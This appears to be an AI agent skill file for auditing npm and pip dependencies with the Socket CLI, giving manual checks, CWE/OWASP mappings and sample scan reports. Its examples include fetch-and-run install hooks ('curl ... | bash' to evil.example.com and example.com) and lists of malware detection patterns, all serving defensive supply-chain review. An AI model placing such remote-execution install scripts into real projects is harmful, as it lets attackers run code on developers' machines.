---
name: socket-sca
description: "Trigger: Socket SCA, supply-chain risk, typosquats, malicious packages, dependency audit. Scans npm/pip/pypi dependencies before release."
when_to_use: "escanear dependencias, supply chain, paquetes maliciosos, typosquatting, auditar npm, auditar pip"
---

# Socket SCA

This skill performs software composition analysis (SCA) for npm and pip projects using the Socket.dev `socket` CLI, identifying supply chain risks such as install-script abuse, typosquatting, obfuscated code, protestware, and malicious packages, then mapping findings to CWE and OWASP Top 10:2021 standards. Where the CLI is unavailable, ten structured manual checks provide partial coverage.

## When to Use

- When the user asks to "scan dependencies for supply chain risks" or "run Socket"
- When the user mentions "SCA", "dependency audit", or "supply chain analysis"
- When reviewing `package.json`, `package-lock.json`, `requirements.txt`, or `Pipfile` before deployment
- When a pull request adds or upgrades dependencies and a security check is requested
- When the user asks to detect typosquatting, install scripts, or malicious packages
- When onboarding a third-party library and due diligence is needed
- When investigating a suspected compromised or protestware package

## When NOT to Use

- When the user wants SAST on application source code (use `bandit-sast` or `semgrep`)
- When the user wants runtime or dynamic analysis (use DAST tools like `nuclei`)
- When the user is asking about code style, formatting, or linting
- When the `security-review` skill already covers the request at a general level
- When scanning container images or IaC templates (use `iac-scanner` instead)
- When the target directory contains **no dependency manifests** (package.json, requirements.txt, Pipfile) — you **MUST** decline and recommend `crypto-audit`, `security-review`, or `bandit-sast` as appropriate
- When the user wants to **generate a CI/CD pipeline** — you **MUST** decline and recommend `devsecops-pipeline`

## Prerequisites

### Tool Installed (Preferred)

```bash
# Detection
socket --version

# Installation (if not found)
npm install -g @socketsecurity/cli
```

Minimum version: Socket CLI 0.9+. A free Socket.dev account is recommended for full alert detail; the CLI works without authentication for basic scans.

### Tool Not Installed (Fallback)

> **Note:** This is a limited review. Install `@socketsecurity/cli` for comprehensive supply chain scanning with real-time threat intelligence.

When the Socket CLI is not available, perform these ten manual supply chain checks:

1. **Typosquatting detection** — Compare each package name character-by-character against known popular packages (e.g., `lodahs` vs `lodash`, `reqeusts` vs `requests`). Flag any name within one or two edit-distance of a top-500 npm/PyPI package.
2. **Install script detection** — Open each direct dependency's `package.json` and check for `"preinstall"`, `"install"`, or `"postinstall"` scripts. Any shell commands here execute automatically on `npm install` and warrant manual review.
3. **Known-malicious package check** — Search package names against public malicious package lists (e.g., Snyk Vuln DB, OSV, PyPI advisory database). Flag any name that has appeared in security advisories.
4. **Overly broad permissions** — Inspect dependency source for `require('child_process')`, `require('net')`, `require('fs')`, `os.system()`, or `subprocess` in packages that have no legitimate need for those capabilities.
5. **Protestware indicators** — Grep dependency source for geopolitical conditionals (`if (country === ...)`, locale checks), calls to `os.exit()`, or destructive file operations (`fs.rmSync`, `shutil.rmtree`) in non-test code.
6. **Dependency age and popularity** — Check npm/PyPI metadata for packages published fewer than 30 days ago with under 500 weekly downloads. New, obscure packages carry elevated supply chain risk.
7. **Pinning gaps** — Scan `package.json` for versions using `^`, `~`, `*`, or no pin at all. Unpinned ranges allow silent malicious upgrades. `requirements.txt` entries without `==` are similarly unsafe.
8. **Excessive transitive dependencies** — Run `npm ls --depth=10` or `pipdeptree` mentally and flag dependency trees deeper than 8 levels or with more than 200 transitive packages, as attack surface grows with tree size.
9. **Obfuscated code patterns** — Search dependency source for `eval(`, `Function(`, `Buffer.from(..., 'base64')`, `__import__('base64')`, or long single-line strings (>500 chars). These are indicators of payload hiding.
10. **Network calls in install hooks** — Check `preinstall`/`postinstall` scripts and `setup.py` for `curl`, `wget`, `fetch(`, `http.get(`, or `urllib` calls. Install-time network access is a common exfiltration and staging vector.

## Workflow

> **MANDATORY FIRST ACTION:** You **MUST** run `socket --version` to check if the Socket CLI is installed. If not found, offer to install via `npm install -g @socketsecurity/cli` before falling back to manual checks. Do NOT skip this step.

> You **MUST** analyze ALL manifest files detected in this step — do not analyze only one ecosystem when multiple are present.

1. **Detect manifest** — Check for `package.json`, `package-lock.json`, `yarn.lock`, `requirements.txt`, `Pipfile`, or `pyproject.toml` to confirm this is an npm or Python project.
2. **Check for Socket CLI** — Run `socket --version` to determine if the CLI is installed.
3. **If Socket CLI is installed:**
   a. For npm projects, run `socket scan create --json .` from the project root to submit the manifest and receive findings.
   b. For Python projects, run `socket scan create --json --python .` or point Socket at the `requirements.txt` file.
   c. Parse the JSON output — each alert contains `type`, `severity`, `packageName`, `packageVersion`, and `description`.
   d. Map each alert `type` to its CWE using the Reference Tables below.
   e. Map each CWE to its OWASP Top 10:2021 category.
4. **If Socket CLI is NOT installed:**
   a. Offer to install via `npm install -g @socketsecurity/cli`.
   b. If the user declines, run the ten manual fallback checks listed in Prerequisites.
   c. Include the disclaimer: "This is a limited review. Install `@socketsecurity/cli` for comprehensive scanning."
5. **Compile findings** — Deduplicate results (same package + alert type counts once) and sort by severity: Critical > High > Medium > Low.
6. **Generate report** — Present findings using the Findings Format below, grouping by affected package where helpful.
7. **Summarize** — State total findings, breakdown by severity, total affected packages, and top 3 remediation priorities.

## Findings Format

> **MANDATORY FORMAT:** You **MUST** include Severity, CWE, and OWASP Top 10:2021 mapping on **every** finding.

Each finding should include:

| Field | Description |
|-------|-------------|
| Severity | Critical / High / Medium / Low |
| CWE | CWE-XXX identifier |
| OWASP | A01-A10 category (OWASP Top 10:2021) |
| Location | package name @ version (manifest file) |
| Issue | Description of the supply chain risk |
| Remediation | How to remediate or mitigate |

### Example Finding

| Field | Value |
|-------|-------|
| Severity | Critical |
| CWE | CWE-506 |
| OWASP | A08:2021 - Software and Data Integrity Failures |
| Location | colors@1.4.2 (package.json) |
| Issue | Package contains a `postinstall` script that downloads and executes a remote payload via `curl` |
| Remediation | Remove this dependency immediately. Pin to a known-safe version or replace with a maintained alternative. |

## Reference Tables

### Socket Alert Type to CWE Mapping

| Alert Type | Description | CWE | OWASP | Severity |
|------------|-------------|-----|-------|----------|
| installScripts | Package runs shell commands during `npm install` via preinstall/postinstall hooks | CWE-506 | A08:2021 | High |
| typosquatting | Package name is suspiciously similar to a popular package, indicating potential impersonation | CWE-1357 | A06:2021 | Critical |
| obfuscatedCode | Package source contains obfuscated or encoded code (base64, eval, minified payloads) | CWE-506 | A08:2021 | High |
| networkAccess | Package makes outbound network calls not typical for its declared purpose | CWE-829 | A08:2021 | Medium |
| shellAccess | Package spawns shell processes or uses child_process/subprocess in unexpected contexts | CWE-78 | A03:2021 | High |
| envVariableAccess | Package reads environment variables that may contain secrets or tokens | CWE-526 | A02:2021 | Medium |
| filesystemAccess | Package accesses filesystem paths outside its expected scope | CWE-732 | A01:2021 | Medium |
| protestware | Package contains geopolitical conditionals or destructive behavior targeting specific locales | CWE-506 | A08:2021 | Critical |
| malware | Package has been confirmed as malicious by Socket threat intelligence | CWE-506 | A08:2021 | Critical |
| unmaintained | Package has not received updates in over 2 years and may contain unpatched vulnerabilities | CWE-1104 | A06:2021 | Medium |
| deprecated | Package has been officially deprecated by its maintainer | CWE-1104 | A06:2021 | Low |
| unresolved | Package version cannot be resolved from the registry (possible removal after malicious activity) | CWE-1104 | A06:2021 | Medium |
| missingDependency | A required transitive dependency is missing, indicating a broken or tampered dependency tree | CWE-494 | A08:2021 | Medium |
| weakCrypto | Package uses deprecated or broken cryptographic algorithms | CWE-327 | A02:2021 | Medium |

### OWASP Top 10:2021 Quick Reference

| Category | Description | Common CWEs in Supply Chain |
|----------|-------------|----------------------------|
| A01:2021 | Broken Access Control | CWE-732 |
| A02:2021 | Cryptographic Failures | CWE-327, CWE-526 |
| A03:2021 | Injection | CWE-78 |
| A06:2021 | Vulnerable and Outdated Components | CWE-1104, CWE-1357 |
| A08:2021 | Software and Data Integrity Failures | CWE-506, CWE-494, CWE-829 |

## Example Usage

### With Socket Installed

**User prompt:**
> "Run a Socket supply chain scan on this project"

**Expected output (abbreviated):**

```text
## Socket SCA Scan Results

Scanned package.json (47 direct dependencies, 312 transitive)

### Findings (6 total: 2 Critical, 2 High, 2 Medium)

| # | Severity | CWE      | OWASP | Package @ Version       | Issue                                                        |
|---|----------|----------|-------|-------------------------|--------------------------------------------------------------|
| 1 | Critical | CWE-1357 | A06   | lodahs@4.17.21          | Typosquatting: name is 1 edit-distance from "lodash"         |
| 2 | Critical | CWE-506  | A08   | event-stream@3.3.6      | Confirmed malware: postinstall exfiltrates wallet keys       |
| 3 | High     | CWE-506  | A08   | build-helper@1.0.2      | Install script downloads remote binary via curl              |
| 4 | High     | CWE-78   | A03   | run-script@2.1.0        | Spawns child_process.exec() with unsanitized input           |
| 5 | Medium   | CWE-829  | A08   | analytics-sdk@5.0.1     | Makes outbound HTTP calls at install time                    |
| 6 | Medium   | CWE-1104 | A06   | legacy-xml-parser@0.3.1 | Unmaintained: last release 2019-08-12, known CVEs unpatched  |

### Recommendations
1. Remove lodahs immediately — this is a typosquat of lodash; add the real lodash if needed (Finding #1)
2. Remove event-stream immediately and audit git history for when it was added (Finding #2)
3. Review build-helper install script at node_modules/build-helper/package.json and replace if unneeded (Finding #3)
```

### Without Socket (Fallback Mode)

**User prompt:**
> "Check these dependencies for supply chain issues"

**Expected output (abbreviated):**

```text
## Supply Chain Review (Manual Fallback)

> Note: This is a limited review. Install @socketsecurity/cli for comprehensive scanning.

Reviewed package.json (12 direct dependencies)

### Findings (3 total: 1 Critical, 1 High, 1 Medium)

| # | Severity | CWE      | OWASP | Package @ Version  | Issue                                                             |
|---|----------|----------|-------|--------------------|-------------------------------------------------------------------|
| 1 | Critical | CWE-1357 | A06   | lodahs@*           | Typosquatting: "lodahs" is likely a typosquat of "lodash"         |
| 2 | High     | CWE-506  | A08   | setup-env@1.2.0    | postinstall script runs: curl https://evil.example.com | bash     |
| 3 | Medium   | CWE-1104 | A06   | request@2.88.2     | Deprecated: maintainer archived this package in 2020              |

### Recommendations
1. Replace lodahs with lodash (official package) (Finding #1)
2. Remove setup-env and investigate when and why it was added (Finding #2)
3. Replace request with node-fetch, got, or axios (Finding #3)
```

### UNSAFE vs SAFE: Key Supply Chain Patterns

**UNSAFE — Unpinned versions (allows silent malicious upgrades):**

```json
{
  "dependencies": {
    "lodash": "*",
    "express": "^4.0.0",
    "axios": "~1.0.0"
  }
}
```

**SAFE — Exact pinned versions:**

```json
{
  "dependencies": {
    "lodash": "4.17.21",
    "express": "4.18.2",
    "axios": "1.6.7"
  }
}
```

**UNSAFE — Install hook with remote execution:**

```json
{
  "scripts": {
    "postinstall": "curl -s https://example.com/setup.sh | bash"
  }
}
```

**SAFE — No install hooks, or hooks limited to local build steps only:**

```json
{
  "scripts": {
    "postinstall": "node scripts/generate-types.js"
  }
}
```
